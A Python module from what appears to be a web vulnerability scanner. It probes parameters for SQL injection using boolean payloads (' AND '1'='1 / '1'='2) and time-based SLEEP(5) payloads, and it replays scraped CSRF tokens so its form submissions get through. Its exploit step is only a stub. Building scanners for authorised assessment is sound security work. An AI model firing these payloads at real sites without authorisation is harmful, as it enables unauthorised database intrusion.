"""SQL Injection Module for TanPha V4 (Global Low, Medium, High)."""
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import re
import time


class SQLInjectionModule(BaseModule):
    name = "SQLInjection"
    module_id = "sql_injection"
    version = "7.1 (Global Hybrid Engine)"
    vulnerability_class = "SQL_INJECTION"
    default_impact = "DATABASE_ACCESS"
    default_privilege = "LIMITED"

    _ERROR_SIGNATURES = [
        "sql syntax", "you have an error in your sql", "unclosed quotation mark",
        "warning: mysql_", "pg_query()", "ora-00933", "sqlstate[",
        "jdbc", "quoted string not properly terminated"
    ]

    def can_run(self, context: TargetContext) -> bool:
        if not context.discovery.parameters:
            context.discovery.parameters = ["id"]
            if not context.discovery.form_action:
                context.discovery.form_action = context.target.base_url
            context.discovery.form_method = "POST"
        return True

    def _has_sql_error(self, response) -> bool:
        if not response: return False
        text = (response.text or "").lower()
        return any(sig in text for sig in self._ERROR_SIGNATURES)

    def _build_target_url(self, base_url: str, param: str, payload: str) -> str:
        parsed = urlparse(base_url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        new_qs = [(k, v + payload) if k == param else (k, v) for k, v in qs]
        return urlunparse(parsed._replace(query=urlencode(new_qs, safe="")))

    def _extract_csrf(self, html):
        if not html: return None, None
        pattern = r'name=["\']([^"\']*(?:token|csrf)[^"\']*)["\'][^>]*value=["\']([^"\']+)["\']'
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            return match.group(1), match.group(2)
        return None, None

    def _get_submit_field(self, context):
        for p in context.discovery.parameters:
            if any(k in p.lower() for k in ["submit", "login", "go", "send", "btn", "save", "upload", "search"]):
                return p
        return "Submit"

    def _send_payload(self, context, param, payload, scope_checker=None, timeout=15):
        if "?" in context.target.base_url:
            target_url = self._build_target_url(context.target.base_url, param, payload)
            return context.http_client.request(
                "GET", target_url, target_param=param,
                scope_checker=scope_checker, bypass_mutation=True, timeout=timeout
            )
        
        target_url = context.discovery.form_action or context.target.base_url
        get_res = context.http_client.request("GET", target_url, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)
        csrf_name, csrf_value = None, None
        if get_res.success and get_res.response:
            csrf_name, csrf_value = self._extract_csrf(get_res.response.text)

        submit_field = self._get_submit_field(context)
        data = {param: payload, submit_field: submit_field}
        
        if csrf_name and csrf_value:
            data[csrf_name] = csrf_value

        return context.http_client.request(
            "POST", target_url, data=data,
            scope_checker=scope_checker, bypass_mutation=True, timeout=timeout
        )

    def assess(self, context: TargetContext, scope_checker=None) -> list[Evidence]:
        evidence_pool = []
        
        # === V7.1 HYBRID PAYLOADS ===
        payload_sets = [
            {
                "type": "String-Based", 
                "true": "' AND '1'='1", 
                "false": "' AND '1'='2", 
                "time": "' AND SLEEP(5) AND '1'='1"
            },
            {
                "type": "Numeric-Based", 
                "true": " AND 1=1", 
                "false": " AND 1=2", 
                "time": " AND SLEEP(5)"
            }
        ]

        for param in context.discovery.parameters:
            print(f"      [>] Testing SQLi on '{param}'...")
            
            baseline_res = self._send_payload(context, param, "", scope_checker)
            if not baseline_res.success or not baseline_res.response: 
                continue
                
            baseline_text = baseline_res.response.text
            baseline_status = baseline_res.response.status_code
            baseline_time = baseline_res.elapsed

            for p_set in payload_sets:
                print(f"          [>] Testing {p_set['type']}...")
                
                # 1. TIME-BASED TEST
                time_res = self._send_payload(context, param, p_set["time"], scope_checker, timeout=15)
                if time_res.elapsed >= (baseline_time + 4.0):
                    print(f"          [!] Time Delay confirmed ({p_set['type']}): {time_res.elapsed:.2f}s")
                    evidence_pool.append(Evidence(
                        attempt_id=f"time_{p_set['type']}", module_id=self.module_id, module_version=self.version,
                        location=context.target.base_url, parameter=param, outcome="DELAYED",
                        reason_code="TIME_BASED", reason_detail=f"Delay {time_res.elapsed:.2f}s ({p_set['type']})",
                        confidence=0.95, evidence_text="Time-based SQLi", assess_payload=p_set["time"]
                    ))
                    break # Kalau udah nemu delay, skip boolean buat param ini

                # 2. BOOLEAN-BASED TEST
                res_false = self._send_payload(context, param, p_set["false"], scope_checker)
                res_true = self._send_payload(context, param, p_set["true"], scope_checker)

                if res_false.success and res_true.success and res_false.response and res_true.response:
                    # Bersihkan teks payload dari HTML
                    clean_false = res_false.response.text.replace(p_set["false"], "")
                    clean_true = res_true.response.text.replace(p_set["true"], "")
                    
                    len_diff = abs(len(clean_true) - len(clean_false))
                    if len_diff > 20:
                        print(f"          [!] Boolean Diff confirmed ({p_set['type']}): {len_diff} chars")
                        evidence_pool.append(Evidence(
                            attempt_id=f"bool_{p_set['type']}", module_id=self.module_id, module_version=self.version,
                            location=context.target.base_url, parameter=param, outcome="CHANGED",
                            reason_code="BOOLEAN_BASED", reason_detail=f"Diff: {len_diff} ({p_set['type']})",
                            confidence=0.85, evidence_text=f"{p_set['type']} Boolean SQLi", assess_payload=p_set["false"]
                        ))
                        break # Kalau udah nemu bool, skip ke param selanjutnya

        return evidence_pool

    def verify(self, context: TargetContext, evidence: Evidence, scope_checker=None) -> VerificationResult:
        print(f"      [*] Verifying '{evidence.parameter}' ({evidence.reason_code})...")

        if evidence.reason_code == "TIME_BASED":
            res = self._send_payload(context, evidence.parameter, evidence.assess_payload, scope_checker, timeout=15)
            if res.elapsed >= 4.0:
                return VerificationResult(VerificationStatus.VALIDATED, 0.95, "TIME_BASED_CONFIRMED", f"Delay {res.elapsed:.2f}s", verify_payload=evidence.assess_payload)
        
        elif evidence.reason_code == "BOOLEAN_BASED":
            # Tebak tipe payload dari evidence
            if "' AND" in evidence.assess_payload:
                true_p = "' AND '1'='1"
                false_p = "' AND '1'='2"
            else:
                true_p = " AND 1=1"
                false_p = " AND 1=2"

            res_false = self._send_payload(context, evidence.parameter, false_p, scope_checker)
            res_true = self._send_payload(context, evidence.parameter, true_p, scope_checker)
            
            if res_false.success and res_true.success and res_false.response and res_true.response:
                clean_false = res_false.response.text.replace(false_p, "")
                clean_true = res_true.response.text.replace(true_p, "")
                if abs(len(clean_true) - len(clean_false)) > 20:
                    return VerificationResult(VerificationStatus.VALIDATED, 0.9, "BOOLEAN_CONFIRMED", "True/False diff confirmed", verify_payload=false_p)

        return VerificationResult(VerificationStatus.REJECTED, 0.0, "VERIFICATION_FAILED", "Target is not vulnerable")

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] SQLI DATA DUMP [***]")
        print("[!] Data dump requires manual tuning based on DBMS.")
